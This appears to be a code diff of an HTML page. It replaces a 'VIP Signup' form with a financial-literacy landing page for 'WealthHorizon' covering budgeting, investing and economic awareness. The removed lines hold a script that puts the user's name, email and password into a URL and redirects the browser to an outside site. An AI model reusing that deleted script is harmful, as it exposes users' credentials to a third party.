@@ -3,188 +3,911 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VIP Signup</title>
+    <title>WealthHorizon | Financial Mastery</title>
     <style>
         :root {
-            --primary: #121212;
-            --secondary: #1e1e1e;
-            --accent: #ffd700;
-            --text: #f5f5f5;
-            --text-secondary: #aaaaaa;
+            --obsidian: #0a0a0a;
+            --platinum: #e5e5e5;
+            --gold: #FFD700;
+            --gold-dark: #D4AF37;
+            --deep-blue: #001F3F;
+            --font-primary: 'Neue Haas Grotesk', 'Helvetica Now', sans-serif;
+            --font-secondary: 'GT America', 'Inter', sans-serif;
         }
-        
-        body {
-            font-family: 'Avenir Next', 'Helvetica Neue', sans-serif;
-            background-color: var(--primary);
-            color: var(--text);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
+
+        @font-face {
+            font-family: 'Neue Haas Grotesk';
+            src: url('https://fonts.cdnfonts.com/css/neue-haas-grotesk-display-pro');
+            font-weight: 400;
+        }
+
+        * {
             margin: 0;
-            padding: 20px;
-            background-image: 
-                radial-gradient(circle at 25% 25%, rgba(255, 215, 0, 0.03) 0%, transparent 50%),
-                radial-gradient(circle at 75% 75%, rgba(255, 215, 0, 0.03) 0%, transparent 50%);
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
         }
-        
-        .form-container {
+
+        body {
+            background-color: var(--obsidian);
+            color: var(--platinum);
+            font-family: var(--font-primary);
+            line-height: 1.8;
+            overflow-x: hidden;
+        }
+
+        /* Enhanced Navigation */
+        .nav-container {
+            position: fixed;
+            top: 0;
             width: 100%;
-            max-width: 400px;
-            background-color: var(--secondary);
-            border-radius: 12px;
-            padding: 40px;
-            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.3);
+            z-index: 1000;
+            padding: 1.5rem 3rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: rgba(10, 10, 10, 0.95);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border-bottom: 1px solid rgba(255, 215, 0, 0.1);
+            transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+
+        .nav-container.scrolled {
+            padding: 1rem 3rem;
+            background: rgba(10, 10, 10, 0.98);
+            border-bottom: 1px solid rgba(255, 215, 0, 0.2);
+        }
+
+        .logo {
+            font-size: 1.8rem;
+            font-weight: 500;
+            letter-spacing: -0.5px;
+            color: var(--platinum);
+            text-decoration: none;
+            font-family: var(--font-secondary);
+            display: flex;
+            align-items: center;
+        }
+
+        .logo span {
+            color: var(--gold);
+            margin-left: 0.5rem;
+        }
+
+        .logo-icon {
+            width: 24px;
+            height: 24px;
+            margin-right: 0.5rem;
+            fill: var(--gold);
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 3rem;
+        }
+
+        .nav-link {
+            color: var(--platinum);
+            text-decoration: none;
+            font-size: 0.95rem;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            font-weight: 450;
+            transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+            position: relative;
+            padding: 0.5rem 0;
+        }
+
+        .nav-link::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 0;
+            height: 1px;
+            background: var(--gold);
+            transition: width 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+
+        .nav-link:hover::after {
+            width: 100%;
+        }
+
+        .nav-link.active {
+            color: var(--gold);
+        }
+
+        .nav-link.active::after {
+            width: 100%;
+        }
+
+        /* Hero section - cinematic experience */
+        .hero {
+            height: 110vh;
+            display: flex;
+            align-items: center;
+            padding: 0 10%;
+            position: relative;
+            overflow: hidden;
+            margin-top: 80px;
+        }
+
+        .hero::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at 75% 50%, rgba(0, 31, 63, 0.15) 0%, rgba(10, 10, 10, 1) 70%);
+            z-index: -1;
+        }
+
+        .hero-content {
+            max-width: 60%;
+        }
+
+        .hero-title {
+            font-size: 4.5rem;
+            font-weight: 500;
+            line-height: 1.1;
+            letter-spacing: -1.5px;
+            margin-bottom: 2rem;
+            background: linear-gradient(90deg, var(--platinum), var(--gold));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .hero-subtitle {
+            font-size: 1.2rem;
+            max-width: 80%;
+            margin-bottom: 3rem;
+            color: rgba(229, 229, 229, 0.8);
+            font-weight: 350;
+        }
+
+        .cta-button {
+            display: inline-block;
+            padding: 1rem 2.5rem;
+            background: transparent;
+            color: var(--gold);
+            border: 1px solid var(--gold);
+            font-size: 0.9rem;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            text-decoration: none;
+            transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .cta-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 215, 0, 0.1), transparent);
+            transition: all 0.6s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+
+        .cta-button:hover {
+            background: rgba(255, 215, 0, 0.05);
+        }
+
+        .cta-button:hover::before {
+            left: 100%;
+        }
+
+        /* Data visualization section */
+        .data-viz {
+            padding: 10rem 10%;
+            background: linear-gradient(180deg, var(--obsidian), #0a0a12);
+            border-top: 1px solid rgba(255, 215, 0, 0.1);
+            border-bottom: 1px solid rgba(255, 215, 0, 0.1);
+        }
+
+        .section-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+            margin-bottom: 5rem;
+        }
+
+        .section-title {
+            font-size: 2.5rem;
+            font-weight: 450;
+            letter-spacing: -0.5px;
+            background: linear-gradient(90deg, var(--platinum), var(--gold-dark));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .section-subtitle {
+            font-size: 1rem;
+            color: rgba(229, 229, 229, 0.6);
+            max-width: 40%;
+            line-height: 1.6;
+        }
+
+        .viz-container {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 2rem;
+        }
+
+        .viz-card {
+            background: rgba(20, 20, 20, 0.5);
+            border: 1px solid rgba(255, 215, 0, 0.1);
+            border-radius: 1px;
+            padding: 2.5rem;
+            transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .viz-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, rgba(255, 215, 0, 0.03), transparent);
+            z-index: -1;
+        }
+
+        .viz-card:hover {
+            transform: translateY(-10px);
+            background: rgba(20, 20, 20, 0.7);
+            border-color: rgba(255, 215, 0, 0.3);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+        }
+
+        .viz-number {
+            font-size: 3.5rem;
+            font-weight: 350;
+            color: var(--gold);
+            margin-bottom: 1rem;
+            font-family: var(--font-secondary);
+        }
+
+        .viz-label {
+            font-size: 0.9rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: rgba(229, 229, 229, 0.7);
+            margin-bottom: 1.5rem;
+        }
+
+        .viz-description {
+            font-size: 0.95rem;
+            line-height: 1.8;
+            color: rgba(229, 229, 229, 0.8);
+        }
+
+        /* Learning pathways */
+        .pathways {
+            padding: 10rem 10%;
+            background: var(--obsidian);
+            position: relative;
+        }
+
+        .pathways::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('https://images.unsplash.com/photo-1454165804606-c3d57bc86b40?ixlib=rb-1.2.1&auto=format&fit=crop&w=1350&q=80') no-repeat center center;
+            background-size: cover;
+            opacity: 0.03;
+            z-index: 0;
+        }
+
+        .pathways-content {
+            position: relative;
+            z-index: 1;
+        }
+
+        .pathway-tabs {
+            display: flex;
+            gap: 1px;
+            margin-bottom: 3rem;
+            border-bottom: 1px solid rgba(255, 215, 0, 0.1);
+        }
+
+        .pathway-tab {
+            padding: 1rem 2rem;
+            background: rgba(10, 10, 10, 0.3);
+            color: rgba(229, 229, 229, 0.7);
+            font-size: 0.9rem;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border-bottom: 2px solid transparent;
+        }
+
+        .pathway-tab:hover {
+            color: var(--platinum);
+            background: rgba(20, 20, 20, 0.5);
+        }
+
+        .pathway-tab.active {
+            background: transparent;
+            color: var(--gold);
+            border-bottom: 2px solid var(--gold);
+        }
+
+        .pathway-content {
+            display: none;
+            animation: fadeIn 0.6s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .pathway-content.active {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 3rem;
+        }
+
+        .pathway-image {
+            width: 100%;
+            height: 500px;
+            background: rgba(10, 10, 10, 0.2);
             border: 1px solid rgba(255, 215, 0, 0.1);
             position: relative;
             overflow: hidden;
         }
-        
-        .form-container::before {
+
+        .pathway-image::before {
             content: '';
             position: absolute;
-            top: -2px;
-            left: -2px;
-            right: -2px;
-            bottom: -2px;
-            background: linear-gradient(45deg, var(--accent), transparent);
-            z-index: -1;
-            border-radius: 14px;
-            opacity: 0.7;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, rgba(255, 215, 0, 0.05), transparent);
         }
-        
-        h1 {
-            font-size: 24px;
-            font-weight: 600;
-            margin-bottom: 30px;
+
+        .pathway-details {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .pathway-title {
+            font-size: 2rem;
+            margin-bottom: 1.5rem;
+            font-weight: 450;
+            color: var(--gold);
+        }
+
+        .pathway-description {
+            margin-bottom: 2rem;
+            color: rgba(229, 229, 229, 0.8);
+            line-height: 1.8;
+        }
+
+        .pathway-features {
+            list-style: none;
+            margin-bottom: 2rem;
+        }
+
+        .pathway-feature {
+            margin-bottom: 1rem;
+            position: relative;
+            padding-left: 1.5rem;
+            color: rgba(229, 229, 229, 0.9);
+        }
+
+        .pathway-feature::before {
+            content: '→';
+            position: absolute;
+            left: 0;
+            color: var(--gold);
+        }
+
+        .pathway-cta {
+            align-self: flex-start;
+            margin-top: 1rem;
+        }
+
+        /* Methodology section */
+        .methodology {
+            padding: 10rem 10%;
+            background: linear-gradient(180deg, #0a0a12, var(--obsidian));
+        }
+
+        /* Economic Awareness section */
+        .economic-awareness {
+            padding: 10rem 10%;
+            background: linear-gradient(180deg, var(--obsidian), #0a0a12);
+            border-top: 1px solid rgba(255, 215, 0, 0.1);
+            border-bottom: 1px solid rgba(255, 215, 0, 0.1);
+        }
+
+        .awareness-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 3rem;
+            margin-top: 5rem;
+        }
+
+        .awareness-card {
+            background: rgba(20, 20, 20, 0.5);
+            border: 1px solid rgba(255, 215, 0, 0.1);
+            padding: 2.5rem;
+            transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+
+        .awareness-card:hover {
+            transform: translateY(-5px);
+            border-color: rgba(255, 215, 0, 0.3);
+        }
+
+        .awareness-card h3 {
+            font-size: 1.5rem;
+            color: var(--gold);
+            margin-bottom: 1.5rem;
+        }
+
+        .awareness-card ul {
+            list-style: none;
+        }
+
+        .awareness-card li {
+            margin-bottom: 1rem;
+            position: relative;
+            padding-left: 1.5rem;
+        }
+
+        .awareness-card li::before {
+            content: '•';
+            position: absolute;
+            left: 0;
+            color: var(--gold);
+        }
+
+        /* Footer */
+        .footer {
+            padding: 5rem 10%;
+            background: #080808;
+            border-top: 1px solid rgba(255, 215, 0, 0.1);
             text-align: center;
+        }
+
+        .footer-logo {
+            font-size: 2rem;
+            margin-bottom: 2rem;
+            color: var(--platinum);
+        }
+
+        .footer-logo span {
+            color: var(--gold);
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 3rem;
+            margin-bottom: 3rem;
+        }
+
+        .footer-link {
+            color: rgba(229, 229, 229, 0.7);
+            text-decoration: none;
+            font-size: 0.9rem;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            transition: color 0.3s ease;
+        }
+
+        .footer-link:hover {
+            color: var(--gold);
+        }
+
+        .footer-copyright {
+            color: rgba(229, 229, 229, 0.5);
+            font-size: 0.8rem;
             letter-spacing: 0.5px;
         }
-        
-        .input-group {
-            margin-bottom: 25px;
-            position: relative;
+
+        /* Responsive adjustments */
+        @media (max-width: 1200px) {
+            .hero-content {
+                max-width: 80%;
+            }
+            
+            .viz-container {
+                grid-template-columns: repeat(2, 1fr);
+            }
+
+            .awareness-grid {
+                grid-template-columns: 1fr;
+            }
         }
-        
-        input {
-            width: 100%;
-            padding: 14px 16px;
-            background-color: rgba(255, 255, 255, 0.05);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 8px;
-            color: var(--text);
-            font-size: 15px;
-            transition: all 0.3s ease;
-            box-sizing: border-box;
+
+        @media (max-width: 992px) {
+            .nav-container {
+                padding: 1rem 2rem;
+            }
+            
+            .hero-title {
+                font-size: 3.5rem;
+            }
+            
+            .section-subtitle {
+                max-width: 60%;
+            }
+            
+            .pathway-content.active {
+                grid-template-columns: 1fr;
+                gap: 2rem;
+            }
+            
+            .pathway-image {
+                height: 400px;
+                order: -1;
+            }
         }
-        
-        input:focus {
-            outline: none;
-            border-color: var(--accent);
-            box-shadow: 0 0 0 2px rgba(255, 215, 0, 0.2);
-        }
-        
-        label {
-            display: block;
-            margin-bottom: 8px;
-            font-size: 13px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            color: var(--text-secondary);
-            font-weight: 500;
-        }
-        
-        .submit-btn {
-            width: 100%;
-            padding: 16px;
-            background-color: var(--accent);
-            color: var(--primary);
-            border: none;
-            border-radius: 8px;
-            font-size: 15px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            margin-top: 10px;
-        }
-        
-        .submit-btn:hover {
-            background-color: #ffc800;
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(255, 215, 0, 0.3);
-        }
-        
-        .form-footer {
-            margin-top: 25px;
-            text-align: center;
-            font-size: 12px;
-            color: var(--text-secondary);
-        }
-        
-        .form-footer a {
-            color: var(--accent);
-            text-decoration: none;
-        }
-        
-        .input-group::after {
-            content: attr(data-max);
-            position: absolute;
-            right: 12px;
-            top: 38px;
-            font-size: 11px;
-            color: var(--text-secondary);
-        }
-        
-        .username-preview {
-            margin-top: 8px;
-            font-size: 13px;
-            color: var(--accent);
-            font-style: italic;
+
+        @media (max-width: 768px) {
+            .nav-container {
+                padding: 1rem;
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            
+            .nav-links {
+                margin-top: 1rem;
+                gap: 1.5rem;
+                flex-wrap: wrap;
+            }
+            
+            .hero {
+                padding: 0 1.5rem;
+                height: auto;
+                padding-top: 8rem;
+                padding-bottom: 8rem;
+                margin-top: 120px;
+            }
+            
+            .hero-content {
+                max-width: 100%;
+            }
+            
+            .hero-title {
+                font-size: 2.5rem;
+            }
+            
+            .hero-subtitle {
+                max-width: 100%;
+            }
+            
+            .section-header {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            
+            .section-subtitle {
+                max-width: 100%;
+                margin-top: 1rem;
+            }
+            
+            .viz-container {
+                grid-template-columns: 1fr;
+            }
+            
+            .pathway-tabs {
+                flex-wrap: wrap;
+            }
+            
+            .pathway-tab {
+                padding: 0.75rem 1.5rem;
+            }
         }
     </style>
 </head>
 <body>
-    <div class="form-container">
-        <h1>Exclusive Access</h1>
-        
-        <form id="signupForm">
-            <div class="input-group" data-max="max 20">
-                <label for="name">Full Name</label>
-                <input type="text" id="name" name="name" maxlength="20" required>
-            </div>
-            
-            <div class="input-group">
-                <label for="email">Email Address</label>
-                <input type="email" id="email" name="email" required>
-            </div>
-            
-            <div class="input-group">
-                <label for="password">Password</label>
-                <input type="password" id="password" name="password" required>
-            </div>
-            
-            <button type="submit" class="submit-btn">
-                Join The Elite
-            </button>
-        </form>
-        
-        <div class="form-footer">
-            By continuing, you agree to our <a href="#">Terms</a> and <a href="#">Privacy Policy</a>
+    <nav class="nav-container">
+        <a href="#" class="logo">
+            <svg class="logo-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                <path d="M12 2L4 12l8 10 8-10-8-10zm0 3.5L18.5 12 12 18.5 5.5 12 12 5.5z"/>
+            </svg>
+            Wealth<span>Horizon</span>
+        </a>
+        <div class="nav-links">
+            <a href="#" class="nav-link" data-section="home">Home</a>
+            <a href="#" class="nav-link" data-section="data">The Divide</a>
+            <a href="#" class="nav-link" data-section="pathways">Learning</a>
+            <a href="#" class="nav-link" data-section="methodology">Methodology</a>
+            <a href="#" class="nav-link" data-section="awareness">Awareness</a>
         </div>
-    </div>
+    </nav>
+
+    <main>
+        <section class="hero" id="home">
+            <div class="hero-content">
+                <h1 class="hero-title">Financial literacy for the next generation</h1>
+                <p class="hero-subtitle">A revolutionary approach to understanding wealth creation, preservation, and distribution through data-driven insights and behavioral economics.</p>
+                <a href="#" class="cta-button" id="methodology-cta">Explore Methodology</a>
+            </div>
+        </section>
+
+        <section class="data-viz" id="data">
+            <div class="section-header">
+                <h2 class="section-title">The Financial Divide</h2>
+                <p class="section-subtitle">Understanding the systemic gaps in financial education that perpetuate wealth inequality.</p>
+            </div>
+            <div class="viz-container">
+                <div class="viz-card">
+                    <div class="viz-number">78%</div>
+                    <div class="viz-label">Of adults live paycheck to paycheck</div>
+                    <div class="viz-description">Despite economic growth, the majority of working adults have less than $500 in savings for emergencies.</div>
+                </div>
+                <div class="viz-card">
+                    <div class="viz-number">1 in 3</div>
+                    <div class="viz-label">Americans have no retirement savings</div>
+                    <div class="viz-description">The retirement crisis looms as traditional pension systems disappear without adequate replacement.</div>
+                </div>
+                <div class="viz-card">
+                    <div class="viz-number">$1.7T</div>
+                    <div class="viz-label">In student loan debt</div>
+                    <div class="viz-description">The education financing system creates generational debt burdens without guaranteed returns.</div>
+                </div>
+            </div>
+        </section>
+
+        <section class="pathways" id="pathways">
+            <div class="pathways-content">
+                <div class="section-header">
+                    <h2 class="section-title">Learning Pathways</h2>
+                    <p class="section-subtitle">Actionable financial strategies tailored to different life stages and socioeconomic backgrounds.</p>
+                </div>
+                <div class="pathway-tabs">
+                    <div class="pathway-tab active" data-tab="foundations">Foundations</div>
+                    <div class="pathway-tab" data-tab="acceleration">Acceleration</div>
+                    <div class="pathway-tab" data-tab="mastery">Mastery</div>
+                </div>
+                <div class="pathway-content active" id="foundations">
+                    <div class="pathway-image"></div>
+                    <div class="pathway-details">
+                        <h3 class="pathway-title">Building Financial Infrastructure</h3>
+                        <p class="pathway-description">Essential concepts for establishing financial stability regardless of income level.</p>
+                        <ul class="pathway-features">
+                            <li class="pathway-feature"><strong>Create a budget</strong> that accounts for all income and expenses, tracking every dollar</li>
+                            <li class="pathway-feature"><strong>Build an emergency fund</strong> covering 3-6 months of living expenses</li>
+                            <li class="pathway-feature"><strong>Pay down high-interest debt</strong> using the avalanche or snowball method</li>
+                            <li class="pathway-feature"><strong>Establish credit</strong> with a secured card or small installment loan if needed</li>
+                            <li class="pathway-feature"><strong>Automate savings</strong> by setting up direct deposits to separate accounts</li>
+                        </ul>
+
+                    </div>
+                </div>
+                <div class="pathway-content" id="acceleration">
+                    <div class="pathway-image"></div>
+                    <div class="pathway-details">
+                        <h3 class="pathway-title">Wealth Acceleration Strategies</h3>
+                        <p class="pathway-description">Advanced techniques for growing capital through strategic investing.</p>
+                        <ul class="pathway-features">
+                            <li class="pathway-feature"><strong>Maximize retirement accounts</strong> (401k, IRA) taking full advantage of employer matches</li>
+                            <li class="pathway-feature"><strong>Diversify investments</strong> across index funds, real estate, and alternative assets</li>
+                            <li class="pathway-feature"><strong>Implement tax strategies</strong> like tax-loss harvesting and Roth conversions</li>
+                            <li class="pathway-feature"><strong>Develop side income streams</strong> through freelancing, rentals, or digital products</li>
+                            <li class="pathway-feature"><strong>Protect assets</strong> with appropriate insurance coverage</li>
+                        </ul>
+    
+                    </div>
+                </div>
+                <div class="pathway-content" id="mastery">
+                    <div class="pathway-image"></div>
+                    <div class="pathway-details">
+                        <h3 class="pathway-title">Financial Mastery & Legacy</h3>
+                        <p class="pathway-description">Sophisticated wealth preservation and intergenerational transfer.</p>
+                        <ul class="pathway-features">
+                            <li class="pathway-feature"><strong>Establish trusts</strong> to protect assets and control distribution</li>
+                            <li class="pathway-feature"><strong>Create estate plans</strong> including wills, healthcare directives, and powers of attorney</li>
+                            <li class="pathway-feature"><strong>Develop philanthropic strategies</strong> through donor-advised funds or foundations</li>
+                            <li class="pathway-feature"><strong>Educate heirs</strong> about financial responsibility and wealth stewardship</li>
+                            <li class="pathway-feature"><strong>Optimize business succession</strong> plans for smooth transitions</li>
+                        </ul>
+
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section class="methodology" id="methodology">
+            <div class="section-header">
+                <h2 class="section-title">Our Methodology</h2>
+                <p class="section-subtitle">Evidence-based financial education combining behavioral economics, neuroscience, and decades of wealth management experience.</p>
+            </div>
+            <div class="viz-container">
+                <div class="viz-card">
+                    <div class="viz-number">1</div>
+                    <div class="viz-label">Cognitive Scaffolding</div>
+                    <div class="viz-description">Complex concepts broken into fundamental building blocks that compound understanding over time.</div>
+                </div>
+                <div class="viz-card">
+                    <div class="viz-number">2</div>
+                    <div class="viz-label">Behavioral Conditioning</div>
+                    <div class="viz-description">Pattern recognition training to develop automatic financial decision-making skills.</div>
+                </div>
+                <div class="viz-card">
+                    <div class="viz-number">3</div>
+                    <div class="viz-label">Contextual Application</div>
+                    <div class="viz-description">Real-world simulations that reinforce learning through practical experience.</div>
+                </div>
+            </div>
+        </section>
+
+        <section class="economic-awareness" id="awareness">
+            <div class="section-header">
+                <h2 class="section-title">Economic Awareness</h2>
+                <p class="section-subtitle">Understanding the macroeconomic forces that shape financial opportunities and risks.</p>
+            </div>
+            <div class="awareness-grid">
+                <div class="awareness-card">
+                    <h3>Market Cycles</h3>
+                    <ul>
+                        <li>Recognize expansion, peak, contraction, and trough phases</li>
+                        <li>Understand how different asset classes perform through cycles</li>
+                        <li>Identify leading economic indicators (LEIs) that signal shifts</li>
+                        <li>Learn historical patterns without assuming perfect repetition</li>
+                        <li>Develop strategies for different cycle phases</li>
+                    </ul>
+                </div>
+                <div class="awareness-card">
+                    <h3>Monetary Policy</h3>
+                    <ul>
+                        <li>Understand central bank tools: interest rates, QE, reserve requirements</li>
+                        <li>Track Federal Reserve announcements and dot plots</li>
+                        <li>Recognize impacts on borrowing costs and asset valuations</li>
+                        <li>Differentiate between accommodative and restrictive policies</li>
+                        <li>Anticipate policy shifts based on inflation and employment data</li>
+                    </ul>
+                </div>
+                <div class="awareness-card">
+                    <h3>Global Economics</h3>
+                    <ul>
+                        <li>Monitor major economies (US, EU, China) and their interdependencies</li>
+                        <li>Understand currency exchange mechanisms and impacts</li>
+                        <li>Track global trade flows and supply chain dynamics</li>
+                        <li>Recognize geopolitical risks and their market implications</li>
+                        <li>Diversify internationally while managing currency risk</li>
+                    </ul>
+                </div>
+                <div class="awareness-card">
+                    <h3>Technological Disruption</h3>
+                    <ul>
+                        <li>Identify emerging technologies with economic potential</li>
+                        <li>Understand adoption curves and hype cycles</li>
+                        <li>Recognize industries vulnerable to disruption</li>
+                        <li>Evaluate investment opportunities in innovation sectors</li>
+                        <li>Prepare for job market shifts caused by automation</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <footer class="footer">
+        <div class="footer-logo">Wealth<span>Horizon</span></div>
+        <div class="footer-links">
+            <a href="#" class="footer-link">About</a>
+            <a href="#" class="footer-link">Research</a>
+            <a href="#" class="footer-link">Partnerships</a>
+            <a href="#" class="footer-link">Contact</a>
+        </div>
+        <p class="footer-copyright">© 2023 WealthHorizon. All rights reserved.</p>
+    </footer>
 
     <script>
-        document.getElementById('signupForm').addEventListener('submit', function(e) {
-            e.preventDefault(); // Prevent default form submission
-            
-            const name = encodeURIComponent(document.getElementById('name').value);
-            const email = encodeURIComponent(document.getElementById('email').value);
-            const password = encodeURIComponent(document.getElementById('password').value);
-            
-            // Redirect to X.com with form data in URL
-            window.location.href = `https://x.com?name=${name}&email=${email}&password=${password}`;
+        // Navigation functionality
+        document.addEventListener('DOMContentLoaded', function() {
+            // Scroll behavior for nav
+            const nav = document.querySelector('.nav-container');
+            window.addEventListener('scroll', function() {
+                if (window.scrollY > 50) {
+                    nav.classList.add('scrolled');
+                } else {
+                    nav.classList.remove('scrolled');
+                }
+            });
+
+            // Smooth scrolling for navigation
+            document.querySelectorAll('.nav-link').forEach(link => {
+                link.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    const sectionId = this.getAttribute('data-section');
+                    const section = document.getElementById(sectionId);
+                    
+                    // Update active nav link
+                    document.querySelectorAll('.nav-link').forEach(navLink => {
+                        navLink.classList.remove('active');
+                    });
+                    this.classList.add('active');
+
+                    // Scroll to section
+                    window.scrollTo({
+                        top: section.offsetTop - 80,
+                        behavior: 'smooth'
+                    });
+                });
+            });
+
+            // Methodology button
+            document.getElementById('methodology-cta').addEventListener('click', function(e) {
+                e.preventDefault();
+                const methodologySection = document.getElementById('methodology');
+                
+                // Update nav
+                document.querySelectorAll('.nav-link').forEach(navLink => {
+                    navLink.classList.remove('active');
+                });
+                document.querySelector('.nav-link[data-section="methodology"]').classList.add('active');
+
+                // Scroll to methodology
+                window.scrollTo({
+                    top: methodologySection.offsetTop - 80,
+                    behavior: 'smooth'
+                });
+            });
+
+            // Pathway tabs functionality
+            const pathwayTabs = document.querySelectorAll('.pathway-tab');
+            pathwayTabs.forEach(tab => {
+                tab.addEventListener('click', function() {
+                    const tabId = this.getAttribute('data-tab');
+                    
+                    // Update active tab
+                    pathwayTabs.forEach(t => t.classList.remove('active'));
+                    this.classList.add('active');
+                    
+                    // Show corresponding content
+                    document.querySelectorAll('.pathway-content').forEach(content => {
+                        content.classList.remove('active');
+                    });
+                    document.getElementById(tabId).classList.add('active');
+                });
+            });
+
+            // Scroll animation
+            const animateOnScroll = () => {
+                const elements = document.querySelectorAll('.viz-card, .section-header, .pathway-content, .awareness-card');
+                
+                elements.forEach(element => {
+                    const elementPosition = element.getBoundingClientRect().top;
+                    const screenPosition = window.innerHeight / 1.2;
+                    
+                    if (elementPosition < screenPosition) {
+                        element.style.opacity = '1';
+                        element.style.transform = 'translateY(0)';
+                    }
+                });
+            };
+
+            // Set initial state
+            document.querySelectorAll('.viz-card, .section-header, .pathway-content, .awareness-card').forEach(el => {
+                el.style.opacity = '0';
+                el.style.transform = 'translateY(30px)';
+                el.style.transition = 'all 0.6s cubic-bezier(0.16, 1, 0.3, 1)';
+            });
+
+            window.addEventListener('scroll', animateOnScroll);
+            window.addEventListener('load', animateOnScroll);
         });
     </script>
 </body>
